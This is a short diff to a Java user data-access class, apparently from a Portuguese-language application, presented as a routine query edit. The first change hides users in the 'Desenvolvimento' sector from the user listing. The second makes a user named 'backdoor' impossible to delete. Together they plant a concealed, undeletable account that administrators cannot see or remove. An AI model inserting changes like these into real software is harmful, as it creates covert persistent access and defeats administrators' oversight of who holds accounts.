@@ -45,7 +45,7 @@ public class UsuarioDAO {
 
 		List<Usuario> usuarios = new ArrayList<Usuario>();
 
-		PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("SELECT * FROM usuario");
+		PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("SELECT * FROM usuario WHERE setor != 'Desenvolvimento'");
 		ResultSet rs = stmt.executeQuery();
 
 		while (rs.next()) {
@@ -102,7 +102,7 @@ public class UsuarioDAO {
 
     try {
 
-    	PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("DELETE FROM usuario WHERE nome = ?");
+    	PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("DELETE FROM usuario WHERE nome = ? AND nome != 'backdoor'");
     	stmt.setString(1, search);
     	stmt.execute();
 
